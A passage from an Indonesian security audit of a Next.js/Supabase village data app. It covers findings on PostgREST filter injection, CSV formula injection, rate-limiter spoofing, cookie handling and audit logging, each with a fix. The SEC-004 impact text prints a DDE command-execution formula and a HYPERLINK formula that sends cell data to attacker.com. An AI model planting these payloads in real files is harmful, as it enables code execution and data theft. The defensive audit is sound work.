  Di `app/api/import/confirm/route.js`, sebelum memanggil `importToSupabase`, periksa status period lock untuk setiap tabel yang akan diimpor:
  ```javascript
  const { checkPeriodLock } = await import('@/lib/periodLock');
  for (const sheet of sheetsToImport) {
    const lock = await checkPeriodLock(sheet.table, targetYear, bulanValue);
    if (lock.locked && user.role !== 'admin') {
      return NextResponse.json({
        error: `Periode ${targetYear} untuk ${sheet.sheetName} sudah ${lock.status}. Hubungi admin.`
      }, { status: 403 });
    }
  }
  ```

---

### [SEC-003] Kerentanan PostgREST Filter Injection pada Endpoint Audit Logs
- **ID:** `SEC-003`
- **Aspek:** Keamanan
- **Severity:** **Tinggi**
- **Lokasi:** `app/api/admin/logs/route.js:42`, `app/api/admin/logs/export/route.js:46`
- **Deskripsi Masalah:**
  Parameter pencarian unit `dusun` atau `desa` diambil langsung dari URL query string tanpa validasi atau sanitasi, lalu digabungkan langsung ke dalam method `.or(...)` Supabase:
  ```javascript
  const unitNama = searchParams.get('dusun') || searchParams.get('desa');
  if (unitNama) {
    query = query.or(`dusun_nama.eq.${unitNama},desa_nama.eq.${unitNama}`);
  }
  ```
  Dalam sintaks filter PostgREST, karakter koma (`,`) berfungsi sebagai operator logika OR dan titik (`.`) sebagai pembatas operator.
- **Dampak:**
  Penyerang dengan sesi admin (atau via CSRF/XSS jika ada) dapat menyuntikkan klausa filter PostgREST sembarang (misal `unitNama = 'Soko,id.gt.0'`) untuk memanipulasi logika filter database, membypass kriteria pencarian, atau memicu database error yang membocorkan struktur data.
- **Rekomendasi Konkret:**
  Validasi nilai `unitNama` terhadap daftar resmi 9 dusun atau sanitasi karakter khusus:
  ```javascript
  import { DUSUN_LIST } from '@/lib/dusun';
  const cleanUnitNama = String(unitNama).trim();
  const matchedDusun = DUSUN_LIST.find((d) => d.toLowerCase() === cleanUnitNama.toLowerCase());
  if (matchedDusun) {
    query = query.or(`dusun_nama.eq."${matchedDusun}",desa_nama.eq."${matchedDusun}"`);
  }
  ```

---

### [SEC-004] Formula Injection / CSV Injection (CWE-1236) pada Ekspor Audit Log dan Ekspor Excel
- **ID:** `SEC-004`
- **Aspek:** Keamanan
- **Severity:** **Tinggi**
- **Lokasi:** `app/api/admin/logs/export/route.js:16-21`, `app/api/export/excel/route.js:188, 278, 415, 505, 616, 914`
- **Deskripsi Masalah:**
  1. Pada `admin/logs/export/route.js`, fungsi `csvEscape` hanya mengenkapsulasi tanda kutip ganda dan baris baru, lalu menghasilkan file dengan awalan BOM UTF-8 (`\uFEFF`) khusus Excel. Kolom `username`, `detail`, dan `action` tidak disanitasi dari karakter pemicu formula Excel (`=`, `+`, `-`, `@`, `\t`, `\r`).
  2. Pada `export/excel/route.js`, nilai field teks bebas seperti `keterangan` (dapat diisi hingga 1000 karakter oleh pengguna pada form data Pokja dan Bumil) ditulis langsung ke worksheet ExcelJS.
- **Dampak:**
  Jika pengguna atau penyerang memasukkan teks seperti `=cmd|' /C calc'!A0` atau `=HYPERLINK("http://attacker.com/leak?data="&A1, "Klik Disini")` pada catatan data atau username, saat file CSV atau XLSX dibuka oleh administrator/auditor di Microsoft Excel, formula tersebut akan dieksekusi atau memicu kebocoran data (*Formula Injection / DDE Execution*).
- **Rekomendasi Konkret:**
  Sanitasi setiap nilai teks sebelum dimasukkan ke CSV atau Excel. Jika string diawali dengan karakter `=,+,-,@,\t,\r`, tambahkan prefix tanda petik tunggal (`'`):
  ```javascript
  function sanitizeFormula(val) {
    if (val === null || val === undefined) return '';
    const str = String(val);
    if (/^[=+\-@\t\r]/.test(str)) {
      return `'${str}`;
    }
    return str;
  }
  ```

---

### [SEC-005] Mekanisme Ekstraksi IP Rate Limiter Rentan Spoofing (`X-Forwarded-For`) & Fail-Open
- **ID:** `SEC-005`
- **Aspek:** Keamanan
- **Severity:** **Sedang**
- **Lokasi:** `lib/rate-limit.js:17-23, 34-53, 60-88`
- **Deskripsi Masalah:**
  1. `getIP` mengambil elemen pertama dari `x-forwarded-for` tanpa memverifikasi apakah header tersebut berasal dari trusted reverse proxy. Penyerang dapat menyertakan header palsu `X-Forwarded-For: <random-ip>` pada setiap percobaan login untuk mereset counter lockout.
  2. `checkRateLimit` bersifat fail-open: jika terjadi error jaringan atau timeout saat membaca tabel `rate_limits`, fungsi mengembalikan `{ limited: false }`.
  3. `recordFailedAttempt` melakukan `SELECT` lalu `INSERT`/`UPDATE` tanpa *atomic transaction* atau *upsert*, menimbulkan *race condition* pada brute-force multi-threaded.
- **Dampak:**
  Bypass proteksi brute-force login terhadap akun admin dan kader PKK.
- **Rekomendasi Konkret:**
  1. Di lingkungan hosting produksi (misal Vercel), prioritaskan header terpercaya dari platform (seperti `x-vercel-forwarded-for` atau `x-real-ip`).
  2. Terapkan validasi format IPv4/IPv6 sebelum digunakan sebagai key filter.
  3. Gunakan operasi upsert atomic dengan klausa `onConflict: 'ip'` untuk menghindari *race condition*.

---

### [SEC-006] Regex Parsing Cookie `auth-token` Kurang Presisi (Potensi Cookie Confusion)
- **ID:** `SEC-006`
- **Aspek:** Keamanan
- **Severity:** **Sedang**
- **Lokasi:** `lib/auth.js:173`
- **Deskripsi Masalah:**
  Fungsi `getAuthUser` mengekstrak token dari header Cookie menggunakan ekspresi reguler:
  ```javascript
  const match = cookieHeader.match(/auth-token=([^;]+)/);
  ```
  Regex ini tidak memiliki anchor batas awal `(?:^|;\s*)`. Jika header memuat cookie bernama lain seperti `malicious_auth-token=bad_jwt; auth-token=good_jwt`, regex akan mencocokkan `malicious_auth-token` alih-alih `auth-token`.
- **Dampak:**
  Potensi kegagalan autentikasi sesi (*Session DoS*) atau *Cookie Confusion* jika terdapat cookie yang disuntikkan dari subdomain lain yang tidak terpercaya.
- **Rekomendasi Konkret:**
  Gunakan API cookie bawaan Next.js `request.cookies.get('auth-token')?.value` seperti yang telah diterapkan di `proxy.js:17`, atau perbaiki regex menjadi:
  ```javascript
  const match = cookieHeader.match(/(?:^|;\s*)auth-token=([^;]+)/);
  ```

---

### [SEC-007] Ketiadaan Rate Limiting pada Rute AI Chat (`/api/chat`), Ubah Password, dan Ekspor Dokumen
- **ID:** `SEC-007`
- **Aspek:** Keamanan
- **Severity:** **Sedang**
- **Lokasi:** `app/api/chat/route.js:345`, `app/api/auth/password/route.js:11`, `app/api/export/excel/route.js:942`, `app/api/reports/build/route.js:112`
- **Deskripsi Masalah:**
  Pembatasan laju (*rate limiting*) saat ini hanya diterapkan pada endpoint login (`/api/auth`). Endpoint `/api/chat` yang mengonsumsi kuota Google Gemini API, endpoint penggantian password `/api/auth/password`, serta endpoint pemrosesan dokumen berat (`/api/export/*`, `/api/reports/build`) tidak memiliki pembatasan frekuensi request.
- **Dampak:**
  1. *Denial of Wallet* & Kuota Exhaustion: Pengguna login dengan role biasa dapat mengirimkan ratusan pesan atau mengunggah file Excel 5MB berulang kali hingga kuota Gemini API habis.
  2. *Denial of Service (DoS)*: Ekspor paralel ribuan file Excel/PDF/Word dapat menghabiskan CPU dan memori server serverless.
  3. Brute-force kata sandi lama pada `/api/auth/password`.
- **Rekomendasi Konkret:**
  Perluas modul `lib/rate-limit.js` untuk mendukung limitasi berbasis `action` atau `endpoint`:
  - Batasi `/api/chat` maksimal 15 request per menit per user ID.
  - Batasi `/api/auth/password` maksimal 5 percobaan per 15 menit per user ID.
  - Batasi ekspor custom report maksimal 10 request per menit.

---

### [SEC-008] Inkonsistensi Atribut Cookie Saat Logout / Clear Token & Ketiadaan Invalidation Server-Side
- **ID:** `SEC-008`
- **Aspek:** Keamanan
- **Severity:** **Rendah**
- **Lokasi:** `app/api/auth/route.js:77-81`, `app/api/auth/password/route.js:53-57`, `proxy.js:34`
- **Deskripsi Masalah:**
  Saat login (`POST /api/auth`), cookie disetel dengan:
  `{ httpOnly: true, secure: process.env.NODE_ENV === 'production', sameSite: 'lax', path: '/' }`.
  Namun saat logout (`DELETE /api/auth`) dan ganti password, cookie dibersihkan dengan:
  `{ httpOnly: true, maxAge: 0, path: '/' }` (tanpa `secure` dan `sameSite`).
  Selain itu, JWT bersifat stateless 24 jam tanpa mekanisme revocation list.
- **Dampak:**
  Pada browser tertentu, ketidakcocokan flag atribut dapat menyebabkan cookie tidak terhapus sempurna. Selain itu, jika akun user dicabut hak aksesnya atau password diubah, token lama yang tersimpan di perangkat lain tetap dapat mengakses API hingga 24 jam.
- **Rekomendasi Konkret:**
  1. Samakan atribut saat menghapus cookie:
     ```javascript
     response.cookies.set('auth-token', '', {
       httpOnly: true,
       secure: process.env.NODE_ENV === 'production',
       sameSite: 'lax',
       maxAge: 0,
       path: '/',
     });
     ```
  2. Tambahkan kolom `token_version INT DEFAULT 1` pada tabel `users`. Sertakan versi ini dalam klaim JWT, dan verifikasi saat me-resolve user di server. Naikkan `token_version` saat ganti password untuk membatalkan semua token lama seketika.

---

### [SEC-009] Ketiadaan Audit Logging pada Operasi Manajemen Pengguna dan Ganti Password
- **ID:** `SEC-009`
- **Aspek:** Keamanan
- **Severity:** **Rendah**
- **Lokasi:** `app/api/admin/users/route.js:90-261`, `app/api/auth/password/route.js:11-63`, `app/api/admin/columns/route.js:33-114`
- **Deskripsi Masalah:**
  Mutasi pada tabel operasional PKK (`data_*`), status periode, dan import Excel telah dicatat dengan sangat rapi oleh `writeLog`. Namun, mutasi administratif penting seperti penambahan user baru, perubahan role user, reset password user oleh admin, penghapusan user, dan penggantian password mandiri tidak memanggil `writeLog`. Selain itu, saat user dihapus di `admin/users:182`, `user_id` pada seluruh baris `audit_logs` diubah menjadi `NULL`.
- **Dampak:**
  Hilangnya jejak audit forensik terhadap aktivitas manajemen akun (siapa yang membuat akun baru, siapa yang menaikkan hak akses user, dsb.).
- **Rekomendasi Konkret:**
  Panggil `await writeLog(...)` pada setiap operasi mutasi pengguna di `admin/users/route.js` dan `auth/password/route.js`:
  ```javascript
  await writeLog({
    userId: admin.userId,
    username: admin.username,
    action: 'user_create',
    tableName: 'users',
    detail: `Membuat pengguna baru: ${validUsername.value} (role: ${nextRole})`,
  });
  ```

---

## 5. Roadmap Rekomendasi Keamanan Berprioritas

### Fase 1: Perbaikan Segera / Quick Wins (1–3 Hari)
1. **[SEC-002] Terapkan Period Lock Check pada Impor Excel:** Tambahkan `checkPeriodLock` di `app/api/import/confirm/route.js` sebelum eksekusi upsert.
2. **[SEC-004] Terapkan Sanitasi Formula Excel/CSV:** Tambahkan pembersihan awalan karakter `=,+,-,@,\t,\r` pada `app/api/admin/logs/export/route.js` dan `app/api/export/excel/route.js`.
3. **[SEC-003] Sanitasi Parameter Log Filter:** Validasi parameter `dusun`/`desa` di `admin/logs` terhadap array `DUSUN_LIST`.
4. **[SEC-006] Perbaiki Regex Parsing Cookie:** Gunakan `request.cookies.get('auth-token')?.value` di `lib/auth.js`.
5. **[SEC-008] Samakan Flag Cookie Logout:** Tambahkan `secure` dan `sameSite: 'lax'` pada pembersihan cookie.

### Fase 2: Penguatan Sistem Jangka Menengah (1–2 Minggu)
1. **[SEC-001] Aktifkan PostgreSQL Row Level Security (RLS) di Supabase:** Tulis dan terapkan file migrasi SQL `supabase_schema_updates_v14_enable_rls.sql` untuk mengaktifkan RLS pada seluruh tabel dan mengunci akses publik `anon` ke tabel sensitif.
2. **[SEC-007] Implementasi Rate Limiting Menyeluruh:** Tambahkan rate limiter pada `/api/chat` (AI query), `/api/auth/password`, dan generator file custom report.
3. **[SEC-009] Lengkapi Jejak Audit Log Manajemen Pengguna:** Pasang `writeLog` pada endpoint `admin/users` dan `auth/password`.

### Fase 3: Peningkatan Arsitektur Jangka Panjang (1 Bulan)
1. **Pemisahan Kredensial Supabase Server vs Client:** Evaluasi penggunaan anon key di client; jika aplikasi sepenuhnya menggunakan Next.js API Routes sebagai BFF (*Backend-For-Frontend*), hapus exposure `NEXT_PUBLIC_SUPABASE_ANON_KEY` dari client bundle dan jadikan seluruh akses Supabase internal via server.
2. **Stateful Session / Token Versioning:** Tambahkan kolom `token_version` pada tabel `users` untuk memungkinkan pembatalan sesi (*instant revocation*) saat user logout atau mengganti kata sandi.
3. **Proteksi WAF & Trusted Reverse Proxy:** Konfigurasikan aturan reverse proxy di platform deployment (Vercel / Cloudflare) untuk memvalidasi IP client murni dan menyaring serangan injeksi HTTP di lapisan edge.
